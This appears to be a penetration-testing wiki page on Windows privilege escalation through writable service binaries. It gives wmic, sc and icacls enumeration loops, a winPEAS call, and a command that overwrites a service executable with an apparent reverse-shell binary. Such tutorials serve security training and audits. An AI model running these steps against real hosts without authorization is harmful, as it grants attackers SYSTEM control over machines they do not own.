# Weak File Permissions

## Theory
It is very often in Windows environments to discover services that run with SYSTEM privileges. If you have write permissions over the folder or binary used by the service you can use it to escalate you privileges.

## Practice

If we have enought permissions over the binary of a service, we can replace it to our own binary. If you have write permissions over the folder you can do [DLL Hijacking]()

{% tabs %}
{% tab title="Enum" %}
We can get every binary that is executed by a service using wmic and check your permissions using icacls
```powershell
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Or we can use `sc` and `icacls`
```powershell
#Get list of services
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt

#Get each permissions over BINARY_PATH_NAME 
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Or we can use the `servicesinfo` module of winpeas
```powershell
winPEASx64.exe servicesinfo
```

{% endtab %}

{% tab title="Exploit" %}
We just have to replace the binary. 
```powershell
copy /y c:\Temp\reverse.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
```

{% endtab %}
{% endtabs %}


## References

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---incorrect-permissions-in-services" %}